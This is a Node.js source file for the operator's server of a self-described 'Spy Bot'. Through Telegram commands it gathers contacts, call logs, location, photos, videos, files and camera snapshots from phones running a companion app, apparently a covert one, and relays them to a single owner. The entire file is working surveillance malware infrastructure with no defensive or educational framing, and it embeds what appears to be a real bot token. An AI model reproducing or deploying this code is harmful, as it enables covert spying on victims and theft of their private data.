const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const express = require('express');

const token = '8811118034:AAHr5UjOeT43-D4zPadC80V6dmQpgsyqIcM';
const YOUR_USER_ID = 2062068620;
const bot = new TelegramBot(token, { polling: true });
const app = express();
app.use(express.json());

// Device Register API
let devices = {};

app.post('/api/register-device', (req, res) => {
    const { deviceId, deviceName, battery, ip, sim, online, time } = req.body;
    devices[deviceId] = { 
        deviceName, 
        battery, 
        ip, 
        sim, 
        online, 
        time,
        lastSeen: Date.now() 
    };
    res.json({ success: true });
});

// App se data aayega
app.post('/api/device-data', (req, res) => {
    const { deviceId, type, data } = req.body;
    
    if (type === 'contacts') {
        bot.sendMessage(YOUR_USER_ID, `📞 Contacts for device ${deviceId}:\n${data}`);
    } else if (type === 'call_logs') {
        bot.sendMessage(YOUR_USER_ID, `📱 Call Logs for device ${deviceId}:\n${data}`);
    } else if (type === 'location') {
        bot.sendMessage(YOUR_USER_ID, `📍 Location for device ${deviceId}:\n${data}`);
    }
    res.json({ success: true });
});

// App se Photo/Video aayega
app.post('/api/upload-data', (req, res) => {
    const { deviceId, type, data } = req.body;
    
    if (type === 'photos') {
        bot.sendMessage(YOUR_USER_ID, `📸 Photos for device ${deviceId}:\n${data}`);
    } else if (type === 'videos') {
        bot.sendMessage(YOUR_USER_ID, `📹 Videos for device ${deviceId}:\n${data}`);
    } else if (type === 'files') {
        bot.sendMessage(YOUR_USER_ID, `📁 Files for device ${deviceId}:\n${data}`);
    }
    res.json({ success: true });
});

// Bot ko commands sunna hai
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥\n\n🎯 Owner: Sheikh Burhan\n\n📜 Commands:\n/devices - View all devices\n/photos - View Photos\n/videos - View Videos\n/files - View Files\n/photo - Download Photo\n/video - Download Video\n/location - Get Location\n/snapshot - Camera Snapshot\n/contacts - Get Contacts\n/call_logs - Get Call Logs\n/browser_history - Get Browser History`);
});

bot.onText(/\/devices/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    
    const online = Object.entries(devices).filter(([id, d]) => d.online === 'online');
    const offline = Object.entries(devices).filter(([id, d]) => d.online !== 'online');
    
    let message = "📱 Device List\n\n";
    message += "🟢 Online Devices:\n";
    if (online.length > 0) {
        online.forEach(([id, d]) => {
            message += `• ${d.deviceName || 'Unknown'}\n`;
            message += `  ID: ${id}\n`;
            message += `  Battery: ${d.battery}%\n`;
            message += `  IP: ${d.ip}\n`;
            message += `  SIM: ${d.sim}\n`;
            message += `  Time: ${d.time}\n\n`;
        });
    } else {
        message += "No online devices.\n";
    }
    
    message += "\n🔴 Offline Devices:\n";
    if (offline.length > 0) {
        offline.forEach(([id, d]) => {
            message += `• ${d.deviceName || 'Unknown'} (ID: ${id})\n`;
        });
    } else {
        message += "No offline devices.\n";
    }
    
    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/photos (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1];
    const photoName = match[2];
    const device = devices[deviceId];
    if (!device) {
        bot.sendMessage(chatId, "Device not found!");
        return;
    }
    // App ko photo download karne ka command bhejo
    axios.post('http://YOUR_SERVER_URL/api/command', { deviceId, command: 'download_photo', photoName })
        .then(response => {
            // App se photo aayegi
            bot.sendPhoto(chatId, response.data.photo);
        })
        .catch(error => {
            bot.sendMessage(chatId, "Photo download failed!");
        });
});

bot.onText(/\/videos (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1];
    const videoName = match[2];
    const device = devices[deviceId];
    if (!device) {
        bot.sendMessage(chatId, "Device not found!");
        return;
    }
    // App ko video download karne ka command bhejo
    axios.post('http://YOUR_SERVER_URL/api/command', { deviceId, command: 'download_video', videoName })
        .then(response => {
            // App se video aayegi
            bot.sendVideo(chatId, response.data.video);
        })
        .catch(error => {
            bot.sendMessage(chatId, "Video download failed!");
        });
});

bot.onText(/\/location (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1];
    const device = devices[deviceId];
    if (!device) {
        bot.sendMessage(chatId, "Device not found!");
        return;
    }
    // App ko location bhejne ka command bhejo
    axios.post('http://YOUR_SERVER_URL/api/command', { deviceId, command: 'get_location' })
        .then(response => {
            bot.sendMessage(chatId, response.data.location);
        })
        .catch(error => {
            bot.sendMessage(chatId, "Location failed!");
        });
});

bot.onText(/\/snapshot (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1];
    const camera = match[2]; // front ya back
    const device = devices[deviceId];
    if (!device) {
        bot.sendMessage(chatId, "Device not found!");
        return;
    }
    // App ko camera snapshot bhejne ka command bhejo
    axios.post('http://YOUR_SERVER_URL/api/command', { deviceId, command: 'take_snapshot', camera })
        .then(response => {
            bot.sendPhoto(chatId, response.data.snapshot);
        })
        .catch(error => {
            bot.sendMessage(chatId, "Snapshot failed!");
        });
});

bot.onText(/\/contacts (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1];
    const device = devices[deviceId];
    if (!device) {
        bot.sendMessage(chatId, "Device not found!");
        return;
    }
    // App ko contacts bhejne ka command bhejo
    axios.post('http://YOUR_SERVER_URL/api/command', { deviceId, command: 'get_contacts' })
        .then(response => {
            bot.sendMessage(chatId, response.data.contacts);
        })
        .catch(error => {
            bot.sendMessage(chatId, "Contacts failed!");
        });
});

bot.onText(/\/call_logs (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    const deviceId = match[1];
    const device = devices[deviceId];
    if (!device) {
        bot.sendMessage(chatId, "Device not found!");
        return;
    }
    // App ko call logs bhejne ka command bhejo
    axios.post('http://YOUR_SERVER_URL/api/command', { deviceId, command: 'get_call_logs' })
        .then(response => {
            bot.sendMessage(chatId, response.data.call_logs);
        })
        .catch(error => {
            bot.sendMessage(chatId, "Call logs failed!");
        });
});

// Authorization check
function isAuthorized(msg) {
    return msg.from.id === YOUR_USER_ID;
}

// Express server start karo
app.listen(3000, () => {
    console.log("Server running on port 3000");
});
